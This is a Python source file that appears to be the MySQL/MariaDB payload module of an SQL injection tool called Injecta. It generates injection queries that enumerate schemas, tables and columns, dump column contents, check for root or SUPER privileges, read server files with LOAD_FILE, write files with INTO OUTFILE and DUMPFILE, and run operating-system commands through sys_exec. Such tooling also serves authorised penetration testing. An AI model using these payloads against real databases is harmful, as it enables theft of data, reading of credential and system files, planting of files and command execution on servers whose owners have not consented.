"""
Injecta — MySQL / MariaDB payload provider
"""
from typing import List


class MySQLPayloads:
    name = "mysql"
    comment = "-- "
    inline_comment = "/*!*/"
    substitution_char = "s"

    @staticmethod
    def version() -> List[str]:
        return [
            "SELECT @@version",
            "SELECT VERSION()",
            "SELECT @@version_comment",
        ]

    @staticmethod
    def databases() -> List[str]:
        return [
            "SELECT schema_name FROM information_schema.schemata",
            "SELECT DISTINCT db FROM mysql.db",
        ]

    @staticmethod
    def tables(db: str) -> List[str]:
        return [
            f"SELECT table_name FROM information_schema.tables WHERE table_schema='{db}'",
            f"SELECT table_name FROM information_schema.tables WHERE table_schema=0x{db.encode().hex()}",
        ]

    @staticmethod
    def columns(db: str, table: str) -> List[str]:
        return [
            f"SELECT column_name FROM information_schema.columns WHERE table_schema='{db}' AND table_name='{table}'",
            f"SELECT column_name FROM information_schema.columns WHERE table_schema=0x{db.encode().hex()} AND table_name=0x{table.encode().hex()}",
        ]

    @staticmethod
    def dump_column(db: str, table: str, column: str, limit: int = 0) -> List[str]:
        q = f"SELECT {column} FROM {db}.{table}"
        if limit > 0:
            q += f" LIMIT {limit}"
        return [q]

    @staticmethod
    def current_user() -> List[str]:
        return ["SELECT CURRENT_USER()", "SELECT USER()"]

    @staticmethod
    def current_db() -> List[str]:
        return ["SELECT DATABASE()"]

    @staticmethod
    def count_tables(db: str) -> List[str]:
        return [f"SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='{db}'"]

    @staticmethod
    def count_columns(db: str, table: str) -> List[str]:
        return [f"SELECT COUNT(*) FROM information_schema.columns WHERE table_schema='{db}' AND table_name='{table}'"]

    @staticmethod
    def count_rows(db: str, table: str) -> List[str]:
        return [f"SELECT COUNT(*) FROM {db}.{table}"]

    @staticmethod
    def banner() -> List[str]:
        return ["SELECT @@version_comment", "SELECT @@version"]

    @staticmethod
    def is_dba() -> List[str]:
        return ["SELECT super_priv FROM mysql.user WHERE user='root'"]

    @staticmethod
    def is_admin() -> List[str]:
        return [
            "SELECT super_priv FROM mysql.user WHERE user=CURRENT_USER()",
            "SELECT 1 FROM information_schema.user_privileges WHERE privilege_type='SUPER' AND grantee LIKE CONCAT('%', CURRENT_USER(), '%')",
        ]

    @staticmethod
    def privileges() -> List[str]:
        return [
            "SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee LIKE CONCAT('%', REPLACE(CURRENT_USER(), '@', '%'))",
            "SHOW GRANTS FOR CURRENT_USER()",
        ]

    @staticmethod
    def file_read(path: str) -> List[str]:
        return [
            f"SELECT LOAD_FILE('{path}')",
            f"SELECT LOAD_FILE(0x{path.encode().hex()})",
        ]

    @staticmethod
    def file_write(path: str, content: str) -> List[str]:
        hex_content = content.encode().hex()
        return [
            f"SELECT 0x{hex_content} INTO OUTFILE '{path}'",
            f"SELECT UNHEX('{hex_content}') INTO DUMPFILE '{path}'",
        ]

    @staticmethod
    def os_cmd(cmd: str) -> List[str]:
        return [
            f"SELECT sys_exec('{cmd}')",
            f"SELECT exec('{cmd}')",
        ]
